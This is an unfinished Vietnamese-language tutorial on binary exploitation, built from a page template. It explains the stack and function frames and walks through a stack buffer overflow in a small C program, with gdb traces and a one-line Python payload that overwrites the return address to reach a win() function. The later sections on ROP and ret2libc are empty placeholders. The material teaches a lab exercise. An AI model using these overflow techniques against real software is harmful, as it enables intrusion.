# Untitled

![](https://via.placeholder.com/72)

#### Logo

Short description\
[Report bug](https://reponame/issues/new?template=bug.md) · [Request feature](https://reponame/issues/new?template=feature.md\&labels=feature)

### Table of contents

* [Introduction](broken-reference)
* [Getting started](broken-reference)
* [Stack overflow](broken-reference)
* [ROP](broken-reference)
* [Ret2win](broken-reference)
* [Ret2shellcode](broken-reference)
* [ret2libc](broken-reference)

### Introduction

* Khai thác nhị phân là nghệ thuật kích hoạt các lỗ hổng và chuyển hướng thực thi mã để thực hiện các chức năng ngoài ý muốn của nhà phát triển và tiếp tục thực thi mã độc hại trên hệ thống. Các lỗ hổng khai thác chủ yếu được tìm thấy trong C, C ++, v.v.

### Getting started

### Stack overflow

#### Introduction Stack

Ngăn xếp là một kiểu dữ liệu trừu tượng thường được sử dụng trong khoa học máy tính. Nó có một thuộc tính là Mục cuối cùng được đặt sẽ là mục đầu tiên được xóa khỏi nó (LIFO). Một số tùy chọn được xác định trên ngăn xếp, những tùy chọn quan trọng nhất là đẩy và bật. đẩy thêm một phần tử lên đầu ngăn xếp và cửa sổ bật lên sẽ xóa các phần tử khỏi đầu.

/\* địa chỉ bộ nhớ của thanh esp \*/

```
┌──────────────┐ <─ sp
└──────────────┘

: push 0x10                               /* sp is incremented and the value is stored at that address */
┌──────────────┐ 
│     0x10     │
└──────────────┘ <─ sp

: push 0x20

┌──────────────┐
│    0x10      │
├──────────────┤
│    0x20      │
└──────────────┘ <─ sp

: pop var                                 /* The value pointed by the sp is removed from the stack and sp is decremented */

┌──────────────┐ 
│     0x10     │
└──────────────┘ <─ sp
```

Máy tính hiện đại được thiết kế với nhu cầu về ngôn ngữ cấp cao trong tâm trí. Kỹ thuật quan trọng nhất để cấu trúc các chương trình được giới thiệu bởi các ngôn ngữ bậc cao là hàm. Theo một quan điểm, một lệnh gọi hàm thay đổi luồng điều khiển giống như một bước nhảy, nhưng không giống như một bước nhảy, khi hoàn thành nhiệm vụ của nó, một hàm trả về điều khiển cho câu lệnh hoặc lệnh sau lệnh gọi. Sự trừu tượng hóa cấp cao này được thực hiện với sự trợ giúp của ngăn xếp.

Ngăn xếp cũng được sử dụng để cấp phát các biến cục bộ, truyền tham số cho các hàm và lưu trữ thông tin cần thiết để trả về hàm người gọi sau khi quá trình thực thi hàm kết thúc.

Con trỏ ngăn xếp là một thanh ghi đặc biệt sẽ luôn trỏ đến đỉnh của ngăn xếp, trong bit x86-32 thanh ghi này được gọi là esp. Vùng được phân bổ trên ngăn xếp cho một hàm được gọi là khung ngăn xếp. và các thanh ghi ebp và esp (trong hệ thống bit x86-32) được sử dụng để xác định ranh giới của khung ngăn xếp. Ebp sẽ trỏ đến việc nhìn chằm chằm vào khung ngăn xếp của hàm hiện tại và thanh ghi esp sẽ trỏ xuống dưới cùng.

### Smash the stack¶

Tràn bộ đệm đề cập đến tình huống khi chúng ta có thể ghi vượt quá kích thước của một biến, dẫn đến thay đổi dữ liệu gần chúng, Khi kiểu tràn này xảy ra trong ngăn xếp, nó được gọi là tràn ngăn xếp. Với điều này, chúng ta có thể thay đổi giá trị của các biến nhạy cảm nằm kề với vùng tràn, Ngoài ra, vì địa chỉ trả về của một hàm được lưu trữ trên ngăn xếp, chúng ta có thể thay đổi luồng điều khiển của chương trình.

```
/* stack-example.c */

#include <stdio.h>
#include <stdlib.h>

void win()
{
  printf("You Win ! ");
  exit(0);
}

void vuln()
{
  char arr[0x10];
  scanf("%s",arr);
  printf("Input  : %s",arr);
}

int main()
{
  vuln();
  return 0;
}
```

Ta có source code c

#### Step 1

Chương trình trên chứa lỗi tràn bộ đệm. kích thước của mảng ký tự là 0x10, vì hàm scanf không giới hạn số lượng đầu vào được đọc từ người dùng đó, nếu lớn hơn 0x10, nó sẽ được ghi sau biến arr. Và nếu chúng ta cung cấp đầu vào đủ lớn, chúng ta có thể gọi win () bằng cách thay đổi địa chỉ trả về của hàm vuln

#### Step 2

```

(gdb) x/10i main+11
   0x80484e7 <main+11>: mov    ebp,esp
   0x80484e9 <main+13>: push   ecx
   0x80484ea <main+14>: sub    esp,0x4
   0x80484ed <main+17>: call   0x80484ab <vuln>
   0x80484f2 <main+22>: mov    eax,0x0
   0x80484f7 <main+27>: add    esp,0x4
   ...
```

#### Step 3

Khi lệnh gọi được thực hiện, địa chỉ của lệnh tiếp theo tức là, 0x80484f2 được đẩy vào ngăn xếp và thanh ghi eip được thay đổi thành 0x80484ab, đây là địa chỉ của hàm vuln. Địa chỉ trả về được lưu trữ trên ngăn xếp để sau khi thực thi hành động, việc thực thi có thể được thay đổi thành địa chỉ đó, do đó mã còn lại của hàm chính được thực thi.

#### Step 4

```
    ┌──────────────┐
    │              │
    │              │ <─ ebp 
          ...
    │              │
    │              │
    ├──────────────┤
    │  0x80484f2   │  <─esp   : value pused by the call instruction (dia chi tra ve) 
    └──────────────┘

    (gdb) x/3i 0x80484ea
       0x80484ea <main+14>: sub    esp,0x4
       0x80484ed <main+17>: call   0x80484ab <vuln>
       0x80484f2 <main+22>: mov    eax,0x0
    (gdb) b * 0x80484ed
    Breakpoint 1 at 0x80484ed

    (gdb) c
    Breakpoint 1, 0x080484ed in main ()

    (gdb) x/i $eip
    => 0x80484ed <main+17>: call   0x80484ab <vuln>

    (gdb) x/4wx $esp
    0xffffce20:     0xf7f9f3dc      0xffffce40      0x00000000      0xf7e04286

    (gdb) si
    0x080484ab in vuln ()

    (gdb) x/4wx $esp
    0xffffce1c:     0x080484f2      0xf7f9f3dc      0xffffce40      0x00000000
                       ^
                       |_ return address pushed onto the stack

    (gdb) x/i $eip
    => 0x80484ab <vuln>:    push   ebp
```

```
    80484ab:          push   ebp
    80484ac:          mov    ebp,esp
```

* Hai lệnh này được gọi là phần mở đầu hàm. Nó khởi tạo một khung ngăn xếp mới cho hàm. Ebp trước đó được đẩy lên ngăn xếp và ebp được chuyển đến cùng vị trí với esp.

```
         ┌──────────────┐
   │              │
   ├──────────────┤
   │  0x0x80484f2 │  
   ├──────────────┤
   │ previous_ebp │ <─ ebp
   ├──────────────┤
   │              │
         ...
   │              │
   ├──────────────┤
   │              │<─  eax   : ( ebp ─ 0x18 ) 
   ├──────────────┤  │
   │              │  │
   ├──────────────┤  │
   │  addr_arr    │──        : It is the starting address of arr array
   ├──────────────┤
   │  0x804858b   │ <─ esp   : It points to the format string 
   └──────────────┘

   (gdb) b * 0x80484bd
   Breakpoint 2 at 0x80484bd
   (gdb) c
   Continuing.

   Breakpoint 2, 0x080484bd in vuln ()

   (gdb) x/i $eip
   => 0x80484bd <vuln+18>: call   0x8048370 <__isoc99_scanf@plt>

   (gdb) x/4wx $esp
   0xffffcdf0:     0x0804858b      0xffffce00      0xf7ffcd00      0x00040000
                        ^              ^
        format string  _|              |_ address of arr array
   (gdb) x/s 0x0804858b
   0x804858b:      "%s"

```

Khi hàm scanf được gọi, đầu vào của chúng ta sẽ được lưu trên ngăn xếp vì hàm scanf đọc dữ liệu cho đến khi trả về xuống dòng và không có giới hạn kiểm tra đầu vào, chúng ta có thể đưa ra đầu vào lớn hơn kích thước của mảng. Nếu chúng tôi cung cấp đủ thông tin đầu vào, chúng tôi thực sự có thể ghi đè địa chỉ trả hàng.

```
                                           After giving 0x20 A's as input 

  ┌──────────────┐               ┌──────────────┐
  │              │               │              │
  ├──────────────┤               ├──────────────┤
  │  0x0x80484f2 │               │    AAAA      │
  ├──────────────┤               ├──────────────┤
  │ previous_ebp │ <─ ebp        │    AAAA      │ <─ ebp
  ├──────────────┤               ├──────────────┤         ─
  │              │               │    AAAA      │          │
        ...                           ....                 │  0x18 x "A"
  │              │               │    AAAA      │          │
  ├──────────────┤               ├──────────────┤          │
  │              │<─  eax        │    AAAA      │<─  eax  ─
  │              │  │            │              │  │
  ├──────────────┤  │            ├──────────────┤  │
  │  addr_arr    │──             │  addr_arr    │──
  ├──────────────┤               ├──────────────┤
  │  0x804858b   │ <─ esp        │  0x804858b   │ <─ esp
  └──────────────┘               └──────────────┘
```

Đếm khúc này thì có vẻ ta hiểu được là cần leed ra địa chỉ của hàm win để control hướng chương trình thực thi là được

Payload : python -c 'print "A" \* 0x1c + "\x8b\x84\x04\x08"' > filename

### ROP

Mình sẽ viết sau

### Ret2win

Mình sẽ viết sau

### ret2shellcode

**Creator 1**

* [https://github.com/usernamecreator1](https://github.com/usernamecreator1)

### ret2libc

Some Text
